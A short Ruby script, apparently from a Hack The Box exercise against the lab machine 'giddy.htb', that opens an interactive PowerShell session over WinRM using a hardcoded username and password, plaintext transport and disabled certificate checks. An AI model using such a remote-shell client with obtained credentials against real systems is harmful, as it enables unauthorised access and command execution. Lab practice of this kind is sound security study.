require 'winrm'
require 'readline'

conn = WinRM::Connection.new(
    endpoint: 'http://giddy.htb:5985/wsman',
  transport: :plaintext,
  user: 'stacy',
  password: 'xNnWo6272k7x',
  :no_ssl_peer_verification => true
)

begin
  conn.shell(:powershell) do |shell|
    while true
      begin
        prompt_output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        prompt = prompt_output.output.chomp
        command = Readline.readline(prompt, true)

        break if command.downcase == "exit"

        output = shell.run(command) do |stdout, stderr|
          STDOUT.print stdout
          STDERR.print stderr
        end
         if output.exitcode != 0
            puts "Command failed with exit code: #{output.exitcode}"
        end
       rescue  WinRM::WinRMHTTPError => e
            puts "Error executing command: #{e.message}"
        end
    end
    puts "Exiting PowerShell session."
  end

rescue WinRM::WinRMAuthorizationError => e
    puts "WinRM Authorization Error: #{e.message}"
rescue WinRM::WinRMError => e
  puts "WinRM Error: #{e.message}"
end

